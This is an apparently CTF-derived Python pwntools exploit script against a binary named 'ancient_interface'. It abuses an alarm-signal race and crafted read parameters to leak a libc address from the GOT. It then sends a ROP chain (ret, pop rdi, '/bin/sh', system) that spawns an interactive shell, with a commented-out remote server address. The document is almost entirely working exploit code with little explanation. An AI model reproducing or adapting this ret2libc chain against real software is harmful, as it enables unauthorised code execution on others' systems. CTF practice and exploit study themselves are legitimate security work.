from pwn import *

context.log_level = 'debug'

elf = ELF('./ancient_interface')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  #for local test
#libc = ELF('./libc.so.6')  #remote, ubuntu 20.04

#ip, port = '165.227.232.214',30666
#io = remote(ip, port)

#io = process('./ancient_interface')
io = gdb.debug('./ancient_interface')

io.recvuntil('$')
for i in range(16):
	io.sendline('alarm '+str(i+10))
io.sendline('read 10 x')
io.recv()
#sleep(60)
for i in range(16):
	io.recvuntil('Alarm has been hit!')
io.recv()

#read_bytes | amnt | p | buf
io.sendline(p32(0)+p32(26)+p64(elf.got['__libc_start_main']-1)+'ABCDEFGHIJ')
io.recv()
io.sendline('vars')
buf = io.recvuntil('\n').strip().ljust(8, '\x00')
print hex(u64(buf))

libc_base = u64(buf) - libc.sym['__libc_start_main']
libc.address = libc_base

io.recv()
'''
0x0000000000401d43 : pop rdi ; ret
0x000000000040101a : ret

ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string /bin/sh
0x00000000001d8698 : /bin/sh

ROPgadget --binary ./libc.so.6 --string /bin/sh
0x00000000001b45bd : /bin/sh

'''
ret = p64(0x000000000040101a)
pop_rdi = p64(0x0000000000401d43)

str_bin = p64(libc_base + 0x00000000001d8698)    #local
#str_bin = p64(libc_base + 0x00000000001b45bd)   #remote

#read_bytes | amnt | p | buf
for i in range(16):
        io.sendline('alarm '+str(i+10))
io.sendline('read 10 y')
io.recv()

for i in range(16):
        io.recvuntil('Alarm has been hit!')
io.recv()
#offset = 4096+8, target in 4096+8+8+8, first return read_bytes = 16+10, payload len = 32, so amt = 4096+8+8+8+32
io.sendline(p32(4096+8-10)+p32(4096+8+8+8+32)+p64(elf.got['puts']-1)+'ABCDEFGHIJ')
payload = ret+pop_rdi+str_bin+p64(libc.sym['system'])
#payload = 'A'*48  #debug
io.sendline(payload)
io.interactive()
